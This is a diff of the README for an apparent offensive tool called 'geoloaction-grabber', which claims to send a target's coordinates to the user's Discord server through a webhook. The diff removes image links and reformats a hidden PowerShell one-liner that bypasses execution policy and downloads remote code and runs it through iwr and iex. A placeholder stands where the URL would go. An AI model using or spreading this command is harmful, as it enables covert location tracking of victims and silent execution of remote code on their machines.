@@ -1,6 +1,3 @@
-![image2](https://user-images.githubusercontent.com/93588803/209906165-30e731b6-a8fe-46c8-b880-86898b2a0ae1.png)
-![image3](https://user-images.githubusercontent.com/93588803/209906166-45d4a03e-e9c8-4852-904a-01461fb235db.png)
-![image4](https://user-images.githubusercontent.com/93588803/209906167-75a9fcbd-bf67-42cc-9bb9-024a95bd70c2.png)
 # geoloaction-grabber
 sends the coordinates of the target to your discord server via webhook
 <p><p/>
@@ -24,4 +21,4 @@ sends the coordinates of the target to your discord server via webhook
 <p>copy that link <p/>
 <p><p/>
 <p>paste that link in the line below where it says paste here <p/>
- ```powershell -w h -NoP -NonI -Exec Bypass iwr PASTE HERE | iex```  
+ ``` powershell -w h -NoP -NonI -Exec Bypass iwr PASTE HERE | iex ```  
